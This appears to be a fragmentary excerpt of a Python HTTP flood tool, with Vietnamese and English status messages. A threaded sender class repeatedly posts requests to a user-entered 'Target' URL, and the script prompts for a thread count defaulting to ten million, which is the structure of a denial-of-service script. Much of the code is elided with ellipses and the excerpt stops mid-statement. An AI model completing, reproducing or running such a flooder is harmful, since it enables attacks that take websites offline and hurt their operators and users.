...
class sender(threading.Thread):
    ...
    def request(self):
        ...
        req = urllib.request.Request(self.url, data, self.headers, self.accept)
        urllib.request.urlopen(req)
        print(Fore.GREEN+'[Dev] Nâng Cấp UA: '+Fore.CYAN+'%s\r\n' % self.url)  
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                sys.stdout.write(Fore.RED+'[Dev] Connection Website : '+Fore.BLUE+'TIMEOUT\n') 
                sys.exit(0)
...
"""      
        ...
        try:
            ...
            url = str(input(f"{Fore.BLUE}[Dev]   Target: {Fore.RESET}"))
        except:
            os.system('cls' if os.name == 'nt' else 'clear')
			#url = sys.argv[1]
            url = str(input(f"{Fore.BLUE}│   Target: {Fore.RESET}"))
        else:
            try:
                ...
                num_threads = str(input(f"{Fore.YELLOW}[Dev]   Threads (10000000): {Fore.RESET}"))
                if num_threads == '':
